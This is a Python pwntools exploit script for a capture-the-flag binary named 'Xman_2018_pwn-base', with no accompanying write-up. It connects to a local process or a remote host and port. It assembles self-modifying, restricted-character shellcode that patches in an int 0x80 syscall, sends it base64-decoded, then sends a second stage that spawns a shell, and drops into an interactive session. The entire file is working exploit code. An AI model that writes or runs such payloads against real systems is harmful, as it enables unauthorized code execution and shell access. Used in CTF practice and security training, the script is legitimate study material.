#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './Xman_2018_pwn-base'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# target is read(0 , &sc , N) (N > len(code1) + len(code2))
# pop ebx # not
# inc eax # not
code1 = '''
push eax
pop edx /* edx -> sc */
push ebx
pop eax
dec eax /* eax = 0xffff */
xor ax, 0x4f65
push eax
pop ecx
push edx
pop eax /* eax -> sc */
xor [eax+0x30], ecx /* int 0x80 */
push eax
pop ecx /* ecx -> sc */
inc ebx
inc ebx
inc ebx
push ebx
pop eax
dec ebx
dec ebx
dec ebx
'''

sc = asm(code1)
# print(sc)
scc = sc.ljust(0x30, "O") + "\x57\x30OO"
print disasm(scc)
final = base64.b64decode(scc)

debug()
p.sendline(final + "\x00")
shellcode = "a" * 0x32 + asm(shellcraft.sh())
p.sendline(shellcode)

p.interactive()

